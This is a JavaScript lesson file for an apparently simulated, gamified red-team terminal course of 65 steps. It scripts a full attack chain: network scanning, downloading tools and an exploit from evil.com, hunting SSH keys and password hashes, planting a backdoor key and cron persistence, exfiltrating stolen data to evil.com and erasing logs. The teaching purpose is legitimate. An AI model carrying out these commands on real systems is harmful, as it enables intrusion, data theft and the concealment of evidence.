// sixthmodule.js
// Module 6: Advanced Offensive Ops (Red Team) - 65 Lessons

const module6_redteam = {
  name: "6. Advanced Offensive Ops (65 Lessons)",
  lessons: [
    // --- PHASE 1: RECONNAISSANCE & ENUMERATION (1-15) ---
    {
      title: "Network Sweep",
      why: "Find targets on your subnet.",
      text: "Type <code>nmap 10.0.0.0/24</code>",
      objective: "Scan subnet 10.0.0.0/24",
      xp: 15,
      check: (c, a) => c === "nmap" && a[0] === "10.0.0.0/24",
    },
    {
      title: "Target Scan",
      why: "Scan standard ports on the target.",
      text: "Type <code>nmap localhost</code>",
      objective: "Scan localhost",
      xp: 10,
      check: (c, a) => c === "nmap" && a[0] === "localhost",
    },
    {
      title: "Service Detection",
      why: "Find out EXACTLY what software is running.",
      text: "Type <code>nmap -sV localhost</code>",
      objective: "Use the -sV flag",
      xp: 20,
      check: (c, a) => c === "nmap" && a.includes("-sV"),
    },
    {
      title: "Default Scripts",
      why: "Run Nmap's built-in vulnerability scripts.",
      text: "Type <code>nmap -sC localhost</code>",
      objective: "Use the -sC flag",
      xp: 20,
      check: (c, a) => c === "nmap" && a.includes("-sC"),
    },
    {
      title: "Aggressive Scan",
      why: "Loud, but gets OS, Scripts, and Versions.",
      text: "Type <code>nmap -A localhost</code>",
      objective: "Use the -A flag",
      xp: 25,
      check: (c, a) => c === "nmap" && a.includes("-A"),
    },
    {
      title: "All Ports Scan",
      why: "Check all 65,535 ports (takes longer).",
      text: "Type <code>nmap -p- localhost</code>",
      objective: "Use the -p- flag",
      xp: 25,
      check: (c, a) => c === "nmap" && a.includes("-p-"),
    },
    {
      title: "UDP Scan",
      why: "Check for hidden UDP services like SNMP.",
      text: "Type <code>nmap -sU localhost</code>",
      objective: "Use the -sU flag",
      xp: 25,
      check: (c, a) => c === "nmap" && a.includes("-sU"),
    },
    {
      title: "Log Nmap Output",
      why: "Save scan data for forensics.",
      text: "Type <code>nmap -A localhost > recon.txt</code>",
      objective: "Redirect scan to recon.txt",
      xp: 30,
      check: (c, a) =>
        c === "nmap" &&
        a.includes("-A") &&
        a.includes(">") &&
        a.includes("recon.txt"),
    },
    {
      title: "Read Recon Log",
      why: "Verify the scan capture.",
      text: "Type <code>cat recon.txt</code>",
      objective: "Read recon.txt",
      xp: 10,
      check: (c, a) => c === "cat" && a[0] === "recon.txt",
    },
    {
      title: "Grep Open Ports",
      why: "Filter the noise.",
      text: 'Type <code>grep "open" recon.txt</code>',
      objective: "Grep for 'open'",
      xp: 20,
      check: (c, a) => c === "grep" && a.includes("open"),
    },
    {
      title: "Web Enum: Headers",
      why: "Fetch HTTP headers to identify the web server.",
      text: "Type <code>curl -I localhost</code>",
      objective: "Use curl -I",
      xp: 20,
      check: (c, a) => c === "curl" && a.includes("-I"),
    },
    {
      title: "Web Enum: Robots",
      why: "Check for hidden paths.",
      text: "Type <code>curl localhost/robots.txt</code>",
      objective: "Curl robots.txt",
      xp: 20,
      check: (c, a) => c === "curl" && a[0].includes("robots.txt"),
    },
    {
      title: "Web Enum: Admin",
      why: "Probe for admin panels.",
      text: "Type <code>curl localhost/admin</code>",
      objective: "Curl the admin endpoint",
      xp: 20,
      check: (c, a) => c === "curl" && a[0].includes("admin"),
    },
    {
      title: "Web Enum: Git",
      why: "Check for exposed source code.",
      text: "Type <code>curl localhost/.git/config</code>",
      objective: "Curl the git config",
      xp: 25,
      check: (c, a) => c === "curl" && a[0].includes(".git"),
    },
    {
      title: "Web Enum: Source",
      why: "Pull the raw HTML of the homepage.",
      text: "Type <code>curl localhost</code>",
      objective: "Curl localhost",
      xp: 10,
      check: (c, a) => c === "curl" && a[0] === "localhost",
    },

    // --- PHASE 2: DELIVERY & EXECUTION (16-30) ---
    {
      title: "Move to TMP",
      why: "The /tmp directory is writable by everyone.",
      text: "Type <code>cd /tmp</code>",
      objective: "cd to /tmp",
      xp: 15,
      check: (c, a) => c === "cd" && a[0] === "/tmp",
    },
    {
      title: "Verify TMP",
      why: "Always verify path.",
      text: "Type <code>pwd</code>",
      objective: "Type pwd",
      xp: 10,
      check: (c) => c === "pwd",
    },
    {
      title: "Download LinPEAS",
      why: "Pull a privilege escalation script from your server.",
      text: "Type <code>curl -O http://evil.com/linpeas.sh</code>",
      objective: "Use curl -O to download",
      xp: 30,
      check: (c, a) =>
        c === "curl" &&
        a.includes("-O") &&
        a.includes("http://evil.com/linpeas.sh"),
    },
    {
      title: "Verify Download",
      why: "Check if the payload landed.",
      text: "Type <code>ls -l linpeas.sh</code>",
      objective: "ls -l linpeas.sh",
      xp: 15,
      check: (c, a) =>
        c === "ls" && a.includes("-l") && a.includes("linpeas.sh"),
    },
    {
      title: "Make Executable",
      why: "Scripts cannot run without the execute permission (+x).",
      text: "Type <code>chmod +x linpeas.sh</code>",
      objective: "chmod +x linpeas.sh",
      xp: 30,
      check: (c, a) =>
        c === "chmod" && a.includes("+x") && a.includes("linpeas.sh"),
    },
    {
      title: "Execute Script",
      why: "Run the payload and log the output.",
      text: "Type <code>./linpeas.sh > enum.txt</code>",
      objective: "Run ./linpeas.sh and redirect",
      xp: 40,
      check: (c, a) =>
        c.includes("./linpeas.sh") && a.includes(">") && a.includes("enum.txt"),
    },
    {
      title: "Read Enum Log",
      why: "Check the results of the script.",
      text: "Type <code>cat enum.txt</code>",
      objective: "cat enum.txt",
      xp: 10,
      check: (c, a) => c === "cat" && a[0] === "enum.txt",
    },
    {
      title: "Grep Vulnerabilities",
      why: "Filter for critical flaws.",
      text: 'Type <code>grep "VULNERABLE" enum.txt</code>',
      objective: "Grep VULNERABLE",
      xp: 25,
      check: (c, a) => c === "grep" && a.includes("VULNERABLE"),
    },
    {
      title: "Download Exploit",
      why: "Pull the compiled exploit binary.",
      text: "Type <code>curl -O http://evil.com/exploit.bin</code>",
      objective: "Curl the exploit binary",
      xp: 30,
      check: (c, a) =>
        c === "curl" &&
        a.includes("-O") &&
        a.includes("http://evil.com/exploit.bin"),
    },
    {
      title: "Chmod Exploit",
      why: "Make the binary executable.",
      text: "Type <code>chmod +x exploit.bin</code>",
      objective: "chmod +x exploit.bin",
      xp: 30,
      check: (c, a) =>
        c === "chmod" && a.includes("+x") && a.includes("exploit.bin"),
    },
    {
      title: "Verify Binary",
      why: "Check permissions.",
      text: "Type <code>ls -la exploit.bin</code>",
      objective: "ls -la exploit.bin",
      xp: 15,
      check: (c, a) =>
        c === "ls" && a.includes("-la") && a.includes("exploit.bin"),
    },
    {
      title: "Execute Exploit",
      why: "Fire the weapon.",
      text: "Type <code>./exploit.bin</code>",
      objective: "Run ./exploit.bin",
      xp: 50,
      check: (c) => c === "./exploit.bin",
    },
    {
      title: "Verify Root",
      why: "Check your current user.",
      text: "Type <code>whoami</code>",
      objective: "Type whoami",
      xp: 10,
      check: (c) => c === "whoami",
    },
    {
      title: "Verify ID",
      why: "Check your exact group IDs.",
      text: "Type <code>id</code>",
      objective: "Type id",
      xp: 15,
      check: (c) => c === "id",
    },
    {
      title: "Analyze Exploit",
      why: "Use strings to look inside the binary you just ran.",
      text: "Type <code>strings exploit.bin</code>",
      objective: "strings exploit.bin",
      xp: 20,
      check: (c, a) => c === "strings" && a[0] === "exploit.bin",
    },

    // --- PHASE 3: PRIVILEGE ESCALATION HUNTS (31-45) ---
    {
      title: "Sudo Check",
      why: "See what you can run as root without a password.",
      text: "Type <code>sudo -l</code>",
      objective: "Type sudo -l",
      xp: 25,
      check: (c, a) => c === "sudo" && a.includes("-l"),
    },
    {
      title: "SUID Search",
      why: "Find system binaries that execute with root privileges.",
      text: "Type <code>find / -perm -4000</code>",
      objective: "find / -perm -4000",
      xp: 40,
      check: (c, a) =>
        c === "find" &&
        a.includes("/") &&
        a.includes("-perm") &&
        a.includes("-4000"),
    },
    {
      title: "Backup Hunt",
      why: "Look for backup files left by admins.",
      text: 'Type <code>find / -name "*.bak"</code>',
      objective: 'find / -name "*.bak"',
      xp: 35,
      check: (c, a) =>
        c === "find" && a.includes("-name") && a.includes('"*.bak"'),
    },
    {
      title: "SSH Key Hunt",
      why: "Look for private keys to steal.",
      text: 'Type <code>find / -name "id_rsa"</code>',
      objective: 'find / -name "id_rsa"',
      xp: 35,
      check: (c, a) =>
        c === "find" && a.includes("-name") && a.includes('"id_rsa"'),
    },
    {
      title: "Read Passwd",
      why: "Look at all system users.",
      text: "Type <code>cat /etc/passwd</code>",
      objective: "cat /etc/passwd",
      xp: 15,
      check: (c, a) => c === "cat" && a[0] === "/etc/passwd",
    },
    {
      title: "Grep Valid Shells",
      why: "Filter for users who can actually log in.",
      text: 'Type <code>grep "sh$" /etc/passwd</code>',
      objective: 'grep "sh$" /etc/passwd',
      xp: 30,
      check: (c, a) => c === "grep" && a.includes('"sh$"'),
    },
    {
      title: "Read Shadow",
      why: "Attempt to read password hashes (Requires root).",
      text: "Type <code>cat /etc/shadow</code>",
      objective: "cat /etc/shadow",
      xp: 20,
      check: (c, a) => c === "cat" && a[0] === "/etc/shadow",
    },
    {
      title: "Read Bash History",
      why: "Admins often type passwords in the clear.",
      text: "Type <code>cat ~/.bash_history</code>",
      objective: "cat ~/.bash_history",
      xp: 20,
      check: (c, a) => c === "cat" && a[0] === "~/.bash_history",
    },
    {
      title: "Grep History Pass",
      why: "Search history for passwords.",
      text: 'Type <code>grep "pass" ~/.bash_history</code>',
      objective: "Grep pass in history",
      xp: 25,
      check: (c, a) => c === "grep" && a.includes("pass"),
    },
    {
      title: "Grep History DB",
      why: "Search history for database logins.",
      text: 'Type <code>grep "mysql" ~/.bash_history</code>',
      objective: "Grep mysql in history",
      xp: 25,
      check: (c, a) => c === "grep" && a.includes("mysql"),
    },
    {
      title: "Check Opt",
      why: "Third-party software often has weak permissions.",
      text: "Type <code>ls -la /opt</code>",
      objective: "ls -la /opt",
      xp: 15,
      check: (c, a) => c === "ls" && a.includes("-la") && a.includes("/opt"),
    },
    {
      title: "Check Backups",
      why: "See if /var/backups has sensitive data.",
      text: "Type <code>ls -la /var/backups</code>",
      objective: "ls -la /var/backups",
      xp: 15,
      check: (c, a) =>
        c === "ls" && a.includes("-la") && a.includes("/var/backups"),
    },
    {
      title: "Read Shadow Backup",
      why: "A backup of the hashes might be readable!",
      text: "Type <code>cat /var/backups/shadow.bak</code>",
      objective: "cat /var/backups/shadow.bak",
      xp: 25,
      check: (c, a) => c === "cat" && a[0] === "/var/backups/shadow.bak",
    },
    {
      title: "Plant Flag",
      why: "Prove you achieved root.",
      text: 'Type <code>echo "hacked" > /root/flag.txt</code>',
      objective: "Write to /root/flag.txt",
      xp: 35,
      check: (c, a) =>
        c === "echo" && a.includes(">") && a.includes("/root/flag.txt"),
    },
    {
      title: "Verify Flag",
      why: "Check the flag.",
      text: "Type <code>cat /root/flag.txt</code>",
      objective: "cat /root/flag.txt",
      xp: 15,
      check: (c, a) => c === "cat" && a[0] === "/root/flag.txt",
    },

    // --- PHASE 4: PERSISTENCE & PIVOTING (46-55) ---
    {
      title: "Go to SSH",
      why: "Move to the ssh config directory.",
      text: "Type <code>cd ~/.ssh</code>",
      objective: "cd ~/.ssh",
      xp: 15,
      check: (c, a) => c === "cd" && a[0] === "~/.ssh",
    },
    {
      title: "Plant SSH Key",
      why: "Add your key to maintain access.",
      text: 'Type <code>echo "ssh-rsa AAA" > authorized_keys</code>',
      objective: "Write to authorized_keys",
      xp: 35,
      check: (c, a) =>
        c === "echo" && a.includes(">") && a.includes("authorized_keys"),
    },
    {
      title: "Lock Key Perms",
      why: "SSH requires keys to be strictly permissioned.",
      text: "Type <code>chmod 600 authorized_keys</code>",
      objective: "chmod 600 authorized_keys",
      xp: 30,
      check: (c, a) =>
        c === "chmod" && a.includes("600") && a.includes("authorized_keys"),
    },
    {
      title: "Verify SSH Key",
      why: "Check if your backdoor is planted.",
      text: "Type <code>cat authorized_keys</code>",
      objective: "cat authorized_keys",
      xp: 10,
      check: (c, a) => c === "cat" && a[0] === "authorized_keys",
    },
    {
      title: "Create Reverse Shell",
      why: "Write a payload to connect back to you.",
      text: 'Type <code>echo "bash -i" > /tmp/shell.sh</code>',
      objective: "Write bash -i to /tmp/shell.sh",
      xp: 40,
      check: (c, a) =>
        c === "echo" && a.includes(">") && a.includes("/tmp/shell.sh"),
    },
    {
      title: "Chmod Shell",
      why: "Make the shell executable.",
      text: "Type <code>chmod +x /tmp/shell.sh</code>",
      objective: "chmod +x /tmp/shell.sh",
      xp: 30,
      check: (c, a) =>
        c === "chmod" && a.includes("+x") && a.includes("/tmp/shell.sh"),
    },
    {
      title: "Dispatch Shell",
      why: "Fire the reverse shell.",
      text: "Type <code>./tmp/shell.sh</code>",
      objective: "Run ./tmp/shell.sh",
      xp: 50,
      check: (c) => c === "./tmp/shell.sh",
    },
    {
      title: "Cronjob Setup",
      why: "Create a persistence job file.",
      text: 'Type <code>echo "* * * * * /tmp/shell.sh" > /tmp/cron.txt</code>',
      objective: "Write to /tmp/cron.txt",
      xp: 40,
      check: (c, a) =>
        c === "echo" && a.includes(">") && a.includes("/tmp/cron.txt"),
    },
    {
      title: "Install Cronjob",
      why: "Load the file into the system scheduler.",
      text: "Type <code>crontab /tmp/cron.txt</code>",
      objective: "Run crontab /tmp/cron.txt",
      xp: 40,
      check: (c, a) => c === "crontab" && a[0] === "/tmp/cron.txt",
    },
    {
      title: "Verify Persistence",
      why: "Check active cron jobs.",
      text: "Type <code>crontab -l</code>",
      objective: "crontab -l",
      xp: 20,
      check: (c, a) => c === "crontab" && a.includes("-l"),
    },

    // --- PHASE 5: EXFILTRATION & CLEANUP (56-65) ---
    {
      title: "Go to Documents",
      why: "Move to the target data.",
      text: "Type <code>cd ~/documents</code>",
      objective: "cd ~/documents",
      xp: 15,
      check: (c, a) => c === "cd" && a[0] === "~/documents",
    },
    {
      title: "Archive Loot",
      why: "Compress the stolen data.",
      text: "Type <code>tar -czvf loot.tar.gz secret.txt</code>",
      objective: "tar -czvf loot.tar.gz secret.txt",
      xp: 40,
      check: (c, a) =>
        c === "tar" && a.includes("-czvf") && a.includes("loot.tar.gz"),
    },
    {
      title: "Verify Archive",
      why: "Check file size before upload.",
      text: "Type <code>ls -lh loot.tar.gz</code>",
      objective: "ls -lh loot.tar.gz",
      xp: 15,
      check: (c, a) =>
        c === "ls" && a.includes("-lh") && a.includes("loot.tar.gz"),
    },
    {
      title: "Exfiltrate Data",
      why: "Send the archive to your C2 server.",
      text: 'Type <code>curl -F "data=@loot.tar.gz" http://evil.com/drop</code>',
      objective: "Use curl to POST data",
      xp: 50,
      check: (c, a) =>
        c === "curl" &&
        a.includes("-F") &&
        a.some((x) => x.includes("loot.tar.gz")),
    },
    {
      title: "Delete Archive",
      why: "Remove evidence.",
      text: "Type <code>rm loot.tar.gz</code>",
      objective: "rm loot.tar.gz",
      xp: 15,
      check: (c, a) => c === "rm" && a[0] === "loot.tar.gz",
    },
    {
      title: "Delete Exploit",
      why: "Remove evidence.",
      text: "Type <code>rm /tmp/exploit.bin</code>",
      objective: "rm /tmp/exploit.bin",
      xp: 15,
      check: (c, a) => c === "rm" && a[0] === "/tmp/exploit.bin",
    },
    {
      title: "Delete Script",
      why: "Remove evidence.",
      text: "Type <code>rm /tmp/linpeas.sh</code>",
      objective: "rm /tmp/linpeas.sh",
      xp: 15,
      check: (c, a) => c === "rm" && a[0] === "/tmp/linpeas.sh",
    },
    {
      title: "Delete Shell",
      why: "Remove evidence.",
      text: "Type <code>rm /tmp/shell.sh</code>",
      objective: "rm /tmp/shell.sh",
      xp: 15,
      check: (c, a) => c === "rm" && a[0] === "/tmp/shell.sh",
    },
    {
      title: "Clear Bash History",
      why: "Overwrite your command log with nothing.",
      text: 'Type <code>echo "" > ~/.bash_history</code>',
      objective: "Empty ~/.bash_history",
      xp: 30,
      check: (c, a) =>
        c === "echo" && a.includes(">") && a.includes("~/.bash_history"),
    },
    {
      title: "Clear Live History",
      why: "Wipe the active session memory.",
      text: "Type <code>history -c</code>",
      objective: "history -c",
      xp: 30,
      check: (c, a) => c === "history" && a.includes("-c"),
    },
  ],
};
